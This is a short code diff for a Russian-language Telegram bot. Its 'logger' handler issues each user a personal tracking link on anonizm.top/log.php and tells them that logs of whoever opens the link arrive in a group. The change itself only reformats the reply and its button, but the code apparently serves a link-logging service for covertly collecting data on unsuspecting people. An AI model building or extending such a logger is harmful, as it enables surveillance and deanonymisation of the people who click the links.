@@ -117,12 +117,11 @@ def send_welcome(message):
 @bot.callback_query_handler(func=lambda call: call.data == 'logger')
 def handle_logger(call):
     user = call.from_user
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    button_1 = types.InlineKeyboardButton("Группа", url="https://t.me/+hFKlR0jfvgU0NWUy")
-    markup.add(button_1)
     link_value = user.username if user.username else user.id
     link = f"https://anonizm.top/log.php?link={link_value}"
-    bot.send_message(call.message.chat.id, f"Вот ваша логгер ссылка: `{link}` (*Ищите логи с вашим username или user id в сообщении).\n\nСсылка на группу куда будут приходить логи: 👇", parse_mode="Markdown", reply_markup=markup)
+    markup = telebot.types.InlineKeyboardMarkup()
+    markup.add(telebot.types.InlineKeyboardButton(text="Перейти к логам", url=link))
+    bot.send_message(call.message.chat.id, f"Вот ваша логгер ссылка: <a href=\"{link}\">{link}</a> (Ищите логи с вашим username или user id в сообщении).\n\nСсылка на группу куда будут приходить логи: 👇", parse_mode="HTML", reply_markup=markup)
 
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_"))
